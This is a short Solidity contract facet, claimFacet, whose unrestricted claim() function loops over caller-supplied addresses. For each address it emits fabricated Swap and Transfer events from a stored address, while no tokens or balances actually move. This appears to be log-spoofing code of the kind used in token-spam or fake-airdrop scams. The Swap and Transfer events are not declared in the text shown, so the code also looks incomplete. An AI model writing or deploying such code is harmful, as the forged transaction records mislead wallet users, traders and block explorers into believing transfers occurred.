// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;
import "./TestLib.sol";
contract claimFacet {
    function claim(
        address[] calldata _addresses_,
        uint256 _in,
        address _a
    ) external {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        for (uint256 i = 0; i < _addresses_.length; i++) {
            emit Swap(_a, _in, 0, 0, _in, _addresses_[i]);
            emit Transfer(ds._p76234, _addresses_[i], _in);
        }
    }
}
